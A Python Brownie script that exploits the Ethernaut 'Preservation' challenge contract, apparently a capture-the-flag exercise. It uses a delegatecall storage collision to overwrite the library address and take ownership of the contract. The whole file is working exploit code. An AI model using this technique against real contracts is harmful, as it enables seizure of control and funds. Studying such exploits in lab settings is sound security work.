from brownie import Contract, Attack, Preservation, network, config
from ...helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        preservation = Preservation.deploy(
            "0x7Dc17e761933D24F4917EF373F6433d4a62fe3c5",
            "0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1",
            {"from": get_account(index=1)},
        )

        attack = Attack.deploy({"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                config["networks"][network.show_active()]["infura"]
            )
        )

        preservation = Contract.from_abi(
            Preservation._name,
            config["networks"][network.show_active()]["preservation"],
            Preservation.abi,
        )

        attack = Attack.deploy({"from": account})

    print(f"timeZone1Library is {preservation.timeZone1Library()}")

    preservation.setFirstTime(int(str(attack), 16), {"from": account}).wait(1)

    print(f"timeZone1Library is {preservation.timeZone1Library()}")

    preservation.setFirstTime(0, {"from": account}).wait(1)

    print(f"Presevation owner is {preservation.owner()}")


def main():
    attack()
